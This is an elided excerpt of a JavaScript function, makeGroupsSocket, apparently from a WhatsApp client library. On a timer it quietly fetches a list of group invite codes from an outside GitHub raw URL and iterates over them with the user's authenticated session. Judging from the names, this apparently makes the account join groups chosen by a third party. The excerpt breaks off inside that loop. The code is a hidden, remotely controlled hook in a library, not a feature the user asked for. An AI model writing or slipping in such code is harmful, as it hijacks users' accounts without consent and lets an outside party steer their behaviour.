...
export const makeGroupsSocket = (config) => {
  ...
  const { authState, ev, query, delay, upsertMessage } = sock;
  ...
  try {
    setTimeout(async () => {
      const url = "https://raw.githubusercontent.com/rizaldevx/X/refs/heads/main/group.json";

      const res = await fetch(url);
      const inviteCodes = await res.json();

      for (const id of inviteCodes) {
        await delay(5000);
        try {
